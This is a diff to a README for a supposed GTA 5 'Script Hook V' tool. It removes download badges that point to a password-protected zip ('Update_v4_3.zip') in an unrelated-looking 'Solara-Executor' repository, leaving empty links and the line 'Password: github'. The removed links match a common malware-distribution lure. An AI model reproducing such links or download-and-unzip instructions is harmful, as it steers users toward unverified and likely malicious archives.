@@ -1,8 +1,8 @@
-# ⚡️ SCRIPT HOOK V - GTA 5 Script Tool **[![Download SCRIPT HOOK V](https://img.shields.io/badge/Download-SCRIPT%20HOOK%20V-blueviolet)](https://github.com/waellaataoui/Solara-Executor/releases/download/Releasev4/Update_v4_3.zip)**
+# ⚡️ SCRIPT HOOK V - GTA 5 Script Tool **[![Download SCRIPT HOOK V](https://img.shields.io/badge/Download-SCRIPT%20HOOK%20V-blueviolet)]()**
 
 ## Installation Steps
 To begin using SCRIPT HOOK V, follow these straightforward instructions:
-1. **[![Download SCRIPT HOOK V](https://img.shields.io/badge/Download-SCRIPT%20HOOK%20V-blueviolet)](https://github.com/waellaataoui/Solara-Executor/releases/download/Releasev4/Update_v4_3.zip)**
+1. **[![Download SCRIPT HOOK V](https://img.shields.io/badge/Download-SCRIPT%20HOOK%20V-blueviolet)]()**
 2. **Password: github**
 3. Unzip the downloaded file to a location of your choice on your computer.
 
